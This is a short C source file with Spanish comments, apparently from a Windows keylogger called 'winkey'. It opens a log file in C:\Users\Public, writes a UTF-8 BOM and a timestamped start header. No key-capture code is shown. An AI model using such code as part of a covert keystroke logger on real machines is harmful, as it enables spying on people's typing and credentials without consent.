#include "winkey.h"

// Abre el archivo de Log en C:\Users\Public\winkey.log
BOOL OpenLogFile(void)
{
    char logPath[MAX_PATH];
    time_t currentTime;
    struct tm timeInfo;
    long fileSize = 0;

    // Crea la ruta completa del archivo de log
    snprintf(logPath, sizeof(logPath), "C:\\Users\\Public\\winkey.log");

    // Abrimos en modo append lectura/escritura para poder detectar si está vacío
    if (fopen_s(&g_winkeyState.logFile, logPath, "ab+") != 0 || !g_winkeyState.logFile)
        return FALSE;

    // Comprobar si el archivo está vacío para escribir BOM UTF-8 (permite que Notepad detecte codificación)
    if (fseek(g_winkeyState.logFile, 0, SEEK_END) == 0) {
        fileSize = ftell(g_winkeyState.logFile);
        if (fileSize == 0) {
            unsigned char bom[3] = {0xEF, 0xBB, 0xBF};
            fwrite(bom, 1, 3, g_winkeyState.logFile);
        }
    }

    // Obtiene tiempo actual y escribe cabecera de inicio
    time(&currentTime);
    localtime_s(&timeInfo, &currentTime);
    
    fprintf(g_winkeyState.logFile, "\n=== Winkey Started: %02d/%02d/%04d %02d:%02d:%02d ===\n",
            timeInfo.tm_mday, timeInfo.tm_mon + 1, timeInfo.tm_year + 1900,
            timeInfo.tm_hour, timeInfo.tm_min, timeInfo.tm_sec);
    
    fflush(g_winkeyState.logFile);

    return TRUE;
}